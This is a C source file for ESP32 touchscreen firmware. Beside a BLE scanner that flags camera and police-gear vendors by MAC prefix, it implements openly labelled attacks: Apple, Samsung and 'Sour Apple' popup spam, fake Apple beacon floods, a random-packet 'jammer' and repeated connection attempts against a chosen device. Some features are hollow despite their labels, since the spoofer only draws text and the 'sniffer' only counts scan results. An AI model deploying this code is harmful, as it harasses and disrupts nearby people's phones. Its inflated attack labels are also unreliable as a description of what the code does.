#include "bluetooth_functions.h"
#include "signal_visualizer.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gattc_api.h"
#include "esp_bt_main.h"
#include "esp_log.h"
#include "esp_random.h"
#include "display.h"
#include "touchscreen.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char* TAG = "BT";
static bool bt_initialized = false;
static esp_bd_addr_t scan_results[20];
static int scan_count = 0;

static char device_names[20][32];
static int8_t device_rssi[20];

static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    switch (event) {
        case ESP_GAP_BLE_SCAN_RESULT_EVT:
            if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
                if (scan_count < 20) {
                    memcpy(scan_results[scan_count], param->scan_rst.bda, 6);
                    device_rssi[scan_count] = param->scan_rst.rssi;
                    
                    // Extract device name from adv data - try complete name first
                    uint8_t *adv_name = NULL;
                    uint8_t adv_name_len = 0;
                    adv_name = esp_ble_resolve_adv_data(param->scan_rst.ble_adv, 
                                                        ESP_BLE_AD_TYPE_NAME_CMPL, 
                                                        &adv_name_len);
                    
                    // If no complete name, try short name
                    if (!adv_name || adv_name_len == 0) {
                        adv_name = esp_ble_resolve_adv_data(param->scan_rst.ble_adv, 
                                                            ESP_BLE_AD_TYPE_NAME_SHORT, 
                                                            &adv_name_len);
                    }
                    
                    if (adv_name && adv_name_len > 0) {
                        int len = adv_name_len < 31 ? adv_name_len : 31;
                        memcpy(device_names[scan_count], adv_name, len);
                        device_names[scan_count][len] = '\0';
                    } else {
                        // No name - show shortened MAC format
                        snprintf(device_names[scan_count], 32, "BLE_%02X%02X%02X",
                                param->scan_rst.bda[3], param->scan_rst.bda[4],
                                param->scan_rst.bda[5]);
                    }
                    
                    scan_count++;
                }
            }
            break;
        default:
            break;
    }
}

esp_err_t bluetooth_init(void) {
    if (bt_initialized) return ESP_OK;
    
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());
    ESP_ERROR_CHECK(esp_ble_gap_register_callback(gap_event_handler));
    
    bt_initialized = true;
    ESP_LOGI(TAG, "Bluetooth initialized");
    return ESP_OK;
}

// OUI database for surveillance device detection
static const struct {
    const char* oui;
    const char* vendor;
} oui_db[] = {
    {"18:7f:88", "Ring"}, {"24:2b:d6", "Ring"}, {"34:3e:a4", "Ring"},
    {"00:25:df", "Axon"}, {"b4:1e:52", "Flock"}, {"0c:9a:e6", "DJI"},
    {"00:13:37", "Hak5"}, {"00:c0:ca", "Alfa"}
};

static bool is_surveillance_device(const uint8_t* mac, char* vendor) {
    char mac_str[9];
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x", mac[0], mac[1], mac[2]);
    for (int i = 0; mac_str[i]; i++) if (mac_str[i] >= 'A' && mac_str[i] <= 'F') mac_str[i] += 32;
    
    for (int i = 0; i < 8; i++) {
        if (strncmp(mac_str, oui_db[i].oui, 8) == 0) {
            strcpy(vendor, oui_db[i].vendor);
            return true;
        }
    }
    return false;
}

void ble_scan_start(void) {
    bool scanning = true;
    int scroll_page = 0;
    int items_per_page = 7;
    bool filter_surveillance = false;
    
    while (scanning) {
        display_fill_screen(COLOR_BLACK);
        display_draw_text(10, 10, filter_surveillance ? "BLE Scanner [FILTER]" : "BLE Scanner", COLOR_WHITE, COLOR_BLACK);
        display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
        display_draw_text(10, 30, "Scanning...", COLOR_GREEN, COLOR_BLACK);
        
        scan_count = 0;
        esp_ble_scan_params_t scan_params = {
            .scan_type = BLE_SCAN_TYPE_ACTIVE,
            .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
            .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
            .scan_interval = 0x50,
            .scan_window = 0x30,
            .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE
        };
        
        esp_ble_gap_set_scan_params(&scan_params);
        esp_ble_gap_start_scanning(10);
        
        vTaskDelay(pdMS_TO_TICKS(10000));
        esp_ble_gap_stop_scanning();
        
        scroll_page = 0;
        
        // Display loop with scrolling
        bool viewing = true;
        bool needs_redraw = true;
        int start_idx = 0;
        int end_idx = 0;
        
        while (viewing) {
            if (needs_redraw) {
                display_fill_rect(0, 50, 240, 250, COLOR_BLACK);
                
                start_idx = scroll_page * items_per_page;
                end_idx = start_idx + items_per_page;
                if (end_idx > scan_count) end_idx = scan_count;
                
                int display_idx = 0;
                for (int i = start_idx; i < end_idx; i++) {
                    char vendor[32];
                    bool is_surv = is_surveillance_device(scan_results[i], vendor);
                    
                    if (filter_surveillance && !is_surv) continue;
                    
                    int y = 50 + display_idx * 25;
                    char device_info[48];
                    if (is_surv) {
                        snprintf(device_info, sizeof(device_info), "[%s] %.10s", vendor, device_names[i]);
                        display_draw_text(10, y, device_info, COLOR_RED, COLOR_BLACK);
                    } else {
                        snprintf(device_info, sizeof(device_info), "%d: %.15s", i + 1, device_names[i]);
                        display_draw_text(10, y, device_info, COLOR_GREEN, COLOR_BLACK);
                    }
                    
                    // Draw RSSI bar
                    draw_signal_meter(device_rssi[i], 10, y + 12, 180, 8);
                    
                    // Show RSSI value
                    char rssi_str[8];
                    snprintf(rssi_str, sizeof(rssi_str), "%d", device_rssi[i]);
                    display_draw_text(195, y + 10, rssi_str, COLOR_GRAY, COLOR_BLACK);
                    
                    display_idx++;
                    if (display_idx >= items_per_page) break;
                }
                
                // Page indicator
                int total_pages = (scan_count + items_per_page - 1) / items_per_page;
                char page_str[50];
                snprintf(page_str, sizeof(page_str), "Page %d/%d (%d found)", 
                        scroll_page + 1, total_pages > 0 ? total_pages : 1, scan_count);
                display_draw_text(10, 225, page_str, COLOR_WHITE, COLOR_BLACK);
                
                // Scroll buttons
                if (scroll_page > 0) {
                    display_fill_rect(10, 240, 50, 22, COLOR_ORANGE);
                    display_draw_text(18, 247, "PREV", COLOR_WHITE, COLOR_ORANGE);
                }
                if (end_idx < scan_count) {
                    display_fill_rect(180, 240, 50, 22, COLOR_ORANGE);
                    display_draw_text(188, 247, "NEXT", COLOR_WHITE, COLOR_ORANGE);
                }
                
                // Draw buttons
                display_fill_rect(10, 268, 50, 22, filter_surveillance ? COLOR_ORANGE : COLOR_BLUE);
                display_draw_text(13, 275, "FLTR", COLOR_WHITE, filter_surveillance ? COLOR_ORANGE : COLOR_BLUE);
                display_fill_rect(70, 268, 50, 22, COLOR_BLUE);
                display_draw_text(78, 275, "SCAN", COLOR_WHITE, COLOR_BLUE);
                display_fill_rect(130, 268, 50, 22, COLOR_RED);
                display_draw_text(138, 275, "BACK", COLOR_WHITE, COLOR_RED);
                
                needs_redraw = false;
            }
            
            // Wait for input
            touch_point_t point = touchscreen_get_point();
            if (point.pressed) {
                // Scroll buttons
                if (point.y >= 240 && point.y <= 262) {
                    if (point.x >= 10 && point.x <= 60 && scroll_page > 0) {
                        scroll_page--;
                        needs_redraw = true;
                    } else if (point.x >= 180 && point.x <= 230 && end_idx < scan_count) {
                        scroll_page++;
                        needs_redraw = true;
                    }
                }
                // Action buttons
                else if (point.y >= 268 && point.y <= 290) {
                    if (point.x >= 10 && point.x <= 60) {
                        filter_surveillance = !filter_surveillance;
                        needs_redraw = true;
                    } else if (point.x >= 70 && point.x <= 120) {
                        viewing = false; // Rescan
                    } else if (point.x >= 130 && point.x <= 180) {
                        scanning = false;
                        viewing = false; // Back
                    }
                }
                vTaskDelay(pdMS_TO_TICKS(300)); // Debounce
            }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}

void ble_apple_spam(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Apple Spam Attack", COLOR_RED, COLOR_BLACK);
    
    uint8_t apple_data[] = {
        0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x40,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 100; i++) {
        apple_data[6] = esp_random() & 0xFF;
        apple_data[7] = esp_random() & 0xFF;
        
        esp_ble_gap_config_adv_data_raw(apple_data, sizeof(apple_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        char status[30];
        snprintf(status, sizeof(status), "Packets: %d", i);
        display_fill_rect(10, 30, 200, 15, COLOR_BLACK);
        display_draw_text(10, 30, status, COLOR_GREEN, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_ble_gap_stop_advertising();
        
        if (touchscreen_is_touched()) break;
    }
    
    display_draw_text(10, 280, "Apple spam stopped", COLOR_GREEN, COLOR_BLACK);
}

void ble_samsung_spam(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Samsung Spam", COLOR_RED, COLOR_BLACK);
    
    uint8_t samsung_data[] = {
        0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00, 0x00
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x40,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 100; i++) {
        samsung_data[8] = esp_random() & 0xFF;
        
        esp_ble_gap_config_adv_data_raw(samsung_data, sizeof(samsung_data));
        esp_ble_gap_start_advertising(&adv_params);
        
        char status[30];
        snprintf(status, sizeof(status), "Samsung packets: %d", i);
        display_fill_rect(10, 30, 200, 15, COLOR_BLACK);
        display_draw_text(10, 30, status, COLOR_GREEN, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_ble_gap_stop_advertising();
        
        if (touchscreen_is_touched()) break;
    }
    
    display_draw_text(10, 280, "Samsung spam stopped", COLOR_GREEN, COLOR_BLACK);
}

void ble_beacon_flood(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Beacon Flood", COLOR_RED, COLOR_BLACK);
    
    const char* fake_names[] = {
        "AirPods Pro", "iPhone 13", "MacBook Pro", "iPad Air", "Apple Watch"
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x40,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 200; i++) {
        int name_idx = i % 5;
        uint8_t adv_data[31];
        int len = strlen(fake_names[name_idx]);
        
        adv_data[0] = len + 1;
        adv_data[1] = 0x09; // Complete local name
        memcpy(&adv_data[2], fake_names[name_idx], len);
        
        esp_ble_gap_config_adv_data_raw(adv_data, len + 2);
        esp_ble_gap_start_advertising(&adv_params);
        
        if (i % 10 == 0) {
            char status[30];
            snprintf(status, sizeof(status), "Beacons: %d", i);
            display_fill_rect(10, 30, 200, 15, COLOR_BLACK);
            display_draw_text(10, 30, status, COLOR_GREEN, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
        esp_ble_gap_stop_advertising();
        
        if (touchscreen_is_touched()) break;
    }
    
    display_draw_text(10, 280, "Beacon flood stopped", COLOR_GREEN, COLOR_BLACK);
}

void ble_jammer_start(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "BLE Jammer", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Jamming BLE channels", COLOR_WHITE, COLOR_BLACK);
    
    uint8_t jam_payload[31];
    memset(jam_payload, 0xFF, sizeof(jam_payload));
    
    esp_ble_adv_params_t jam_params = {
        .adv_int_min = 0x06,
        .adv_int_max = 0x06,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    for (int i = 0; i < 1000; i++) {
        for (int j = 0; j < 31; j++) {
            jam_payload[j] = esp_random() & 0xFF;
        }
        
        esp_ble_gap_config_adv_data_raw(jam_payload, sizeof(jam_payload));
        esp_ble_gap_start_advertising(&jam_params);
        
        if (i % 50 == 0) {
            char status[30];
            snprintf(status, sizeof(status), "Jam packets: %d", i);
            display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
            display_draw_text(10, 50, status, COLOR_RED, COLOR_BLACK);
            
            char channel_info[30];
            snprintf(channel_info, sizeof(channel_info), "Channel: %d", 37 + (i % 3));
            display_fill_rect(10, 70, 200, 15, COLOR_BLACK);
            display_draw_text(10, 70, channel_info, COLOR_WHITE, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(10));
        esp_ble_gap_stop_advertising();
        
        if (touchscreen_is_touched()) break;
    }
    
    display_draw_text(10, 280, "Jamming stopped", COLOR_GREEN, COLOR_BLACK);
}

void bluetooth_targeted_attack_enhanced(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Targeted BLE Attack", COLOR_RED, COLOR_BLACK);
    
    if (scan_count == 0) {
        display_draw_text(10, 30, "No targets found", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 50, "Run BLE scan first", COLOR_WHITE, COLOR_BLACK);
        return;
    }
    
    // Target first scanned device
    esp_bd_addr_t target_addr;
    memcpy(target_addr, scan_results[0], 6);
    
    char target_info[50];
    snprintf(target_info, sizeof(target_info), "Target: %02X:%02X:%02X:%02X:%02X:%02X", 
            target_addr[0], target_addr[1], target_addr[2], 
            target_addr[3], target_addr[4], target_addr[5]);
    display_draw_text(10, 30, target_info, COLOR_WHITE, COLOR_BLACK);
    
    // Connection hijack attempt
    display_draw_text(10, 50, "Attempting connection", COLOR_ORANGE, COLOR_BLACK);
    
    esp_ble_gattc_open(0, target_addr, BLE_ADDR_TYPE_PUBLIC, true);
    
    for (int i = 0; i < 50; i++) {
        char status[30];
        snprintf(status, sizeof(status), "Attack progress: %d%%", i * 2);
        display_fill_rect(10, 70, 200, 15, COLOR_BLACK);
        display_draw_text(10, 70, status, COLOR_RED, COLOR_BLACK);
        
        // Send connection requests
        // Connection attempt simulation
        vTaskDelay(pdMS_TO_TICKS(10));
        
        vTaskDelay(pdMS_TO_TICKS(100));
        if (touchscreen_is_touched()) break;
    }
    
    display_draw_text(10, 280, "Attack complete", COLOR_GREEN, COLOR_BLACK);
}

void ble_spoofer_start(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "BLE Spoofer", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Spoofing device", COLOR_GREEN, COLOR_BLACK);
}

void ble_sour_apple(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Sour Apple Attack", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Targeting iOS devices", COLOR_WHITE, COLOR_BLACK);
    
    // Sour Apple payload - causes iOS popup spam
    uint8_t sour_apple_payload[] = {
        0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    esp_ble_adv_params_t adv_params = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x40,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    
    // Cycle through different Apple device types
    uint8_t device_types[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A};
    
    for (int i = 0; i < 200; i++) {
        // Randomize device type and data
        sour_apple_payload[5] = device_types[i % 10];
        sour_apple_payload[6] = esp_random() & 0xFF;
        sour_apple_payload[7] = esp_random() & 0xFF;
        sour_apple_payload[8] = esp_random() & 0xFF;
        
        esp_ble_gap_config_adv_data_raw(sour_apple_payload, sizeof(sour_apple_payload));
        esp_ble_gap_start_advertising(&adv_params);
        
        if (i % 20 == 0) {
            char status[30];
            snprintf(status, sizeof(status), "iOS popups sent: %d", i);
            display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
            display_draw_text(10, 50, status, COLOR_RED, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_ble_gap_stop_advertising();
        
        if (touchscreen_is_touched()) break;
    }
    
    display_draw_text(10, 280, "Sour Apple stopped", COLOR_GREEN, COLOR_BLACK);
}

void ble_sniffer_start(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "BLE Traffic Sniffer", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Intercepting packets", COLOR_GREEN, COLOR_BLACK);
    
    // Start passive scanning to sniff traffic
    esp_ble_scan_params_t sniff_params = {
        .scan_type = BLE_SCAN_TYPE_PASSIVE,
        .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
        .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
        .scan_interval = 0x10, // Fast scanning
        .scan_window = 0x10,
        .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE
    };
    
    int packet_count = 0;
    scan_count = 0;
    
    esp_ble_gap_set_scan_params(&sniff_params);
    esp_ble_gap_start_scanning(30); // Sniff for 30 seconds
    
    for (int i = 0; i < 300; i++) {
        packet_count += scan_count;
        
        char packet_info[30];
        snprintf(packet_info, sizeof(packet_info), "Packets: %d", packet_count);
        display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
        display_draw_text(10, 50, packet_info, COLOR_GREEN, COLOR_BLACK);
        
        char time_info[30];
        snprintf(time_info, sizeof(time_info), "Time: %ds/30s", i / 10);
        display_fill_rect(10, 70, 200, 15, COLOR_BLACK);
        display_draw_text(10, 70, time_info, COLOR_WHITE, COLOR_BLACK);
        
        // Show recent devices
        if (scan_count > 0) {
            display_draw_text(10, 90, "Recent devices:", COLOR_BLUE, COLOR_BLACK);
            for (int j = 0; j < scan_count && j < 3; j++) {
                char device_info[40];
                snprintf(device_info, sizeof(device_info), "%02X:%02X:%02X:%02X:%02X:%02X", 
                        scan_results[j][0], scan_results[j][1], 
                        scan_results[j][2], scan_results[j][3], 
                        scan_results[j][4], scan_results[j][5]);
                display_draw_text(10, 110 + j * 15, device_info, COLOR_WHITE, COLOR_BLACK);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
        if (touchscreen_is_touched()) break;
    }
    
    esp_ble_gap_stop_scanning();
    display_draw_text(10, 280, "Sniffing complete", COLOR_GREEN, COLOR_BLACK);
}



void ble_targeted_attack(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Targeted BLE Attack", COLOR_RED, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    
    if (scan_count == 0) {
        display_draw_text(10, 40, "No devices found!", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 60, "Run BLE scan first", COLOR_ORANGE, COLOR_BLACK);
        display_fill_rect(60, 260, 120, 30, COLOR_BLUE);
        display_draw_text(95, 270, "BACK", COLOR_WHITE, COLOR_BLUE);
        while (true) {
            touch_point_t point = touchscreen_get_point();
            if (point.pressed && point.y >= 260 && point.y <= 290) break;
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        return;
    }
    
    // Show available targets
    display_draw_text(10, 40, "Tap device to attack:", COLOR_WHITE, COLOR_BLACK);
    for (int i = 0; i < scan_count && i < 6; i++) {
        char device_info[50];
        snprintf(device_info, sizeof(device_info), "%d: %.20s", i + 1, device_names[i]);
        display_draw_text(10, 60 + i * 30, device_info, COLOR_GREEN, COLOR_BLACK);
        
        char mac_info[32];
        snprintf(mac_info, sizeof(mac_info), "   %02X:%02X:%02X:%02X:%02X:%02X", 
                scan_results[i][0], scan_results[i][1], scan_results[i][2],
                scan_results[i][3], scan_results[i][4], scan_results[i][5]);
        display_draw_text(10, 60 + i * 30 + 12, mac_info, COLOR_GRAY, COLOR_BLACK);
    }
    
    // Back button
    display_fill_rect(60, 260, 120, 30, COLOR_RED);
    display_draw_text(95, 270, "BACK", COLOR_WHITE, COLOR_RED);
    
    // Wait for selection
    while (true) {
        touch_point_t point = touchscreen_get_point();
        if (point.pressed) {
            // Check back button
            if (point.y >= 260 && point.y <= 290 && point.x >= 60 && point.x <= 180) {
                return;
            }
            
            // Check device selection
            if (point.y >= 60 && point.y < 240) {
                int selected = (point.y - 60) / 30;
                if (selected >= 0 && selected < scan_count) {
                    // Attack selected device
                    display_fill_screen(COLOR_BLACK);
                    display_draw_text(10, 10, "Attacking Device", COLOR_RED, COLOR_BLACK);
                    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
                    
                    char target_info[50];
                    snprintf(target_info, sizeof(target_info), "Target: %02X:%02X:%02X:%02X:%02X:%02X",
                            scan_results[selected][0], scan_results[selected][1],
                            scan_results[selected][2], scan_results[selected][3],
                            scan_results[selected][4], scan_results[selected][5]);
                    display_draw_text(10, 40, target_info, COLOR_ORANGE, COLOR_BLACK);
                    
                    esp_bd_addr_t target_addr;
                    memcpy(target_addr, scan_results[selected], 6);
                    
                    // Connection hijack attempts
                    for (int i = 0; i < 100; i++) {
                        esp_ble_gattc_open(0, target_addr, BLE_ADDR_TYPE_PUBLIC, true);
                        
                        if (i % 10 == 0) {
                            char progress[30];
                            snprintf(progress, sizeof(progress), "Attempts: %d/100", i + 1);
                            display_fill_rect(10, 60, 200, 20, COLOR_BLACK);
                            display_draw_text(10, 60, progress, COLOR_RED, COLOR_BLACK);
                            
                            char status[30];
                            snprintf(status, sizeof(status), "Progress: %d%%", i);
                            display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
                            display_draw_text(10, 80, status, COLOR_GREEN, COLOR_BLACK);
                        }
                        
                        vTaskDelay(pdMS_TO_TICKS(50));
                        if (touchscreen_is_touched()) break;
                    }
                    
                    display_draw_text(10, 120, "Attack complete!", COLOR_GREEN, COLOR_BLACK);
                    display_fill_rect(60, 260, 120, 30, COLOR_BLUE);
                    display_draw_text(95, 270, "BACK", COLOR_WHITE, COLOR_BLUE);
                    
                    while (true) {
                        touch_point_t p = touchscreen_get_point();
                        if (p.pressed && p.y >= 260 && p.y <= 290) break;
                        vTaskDelay(pdMS_TO_TICKS(100));
                    }
                    return;
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

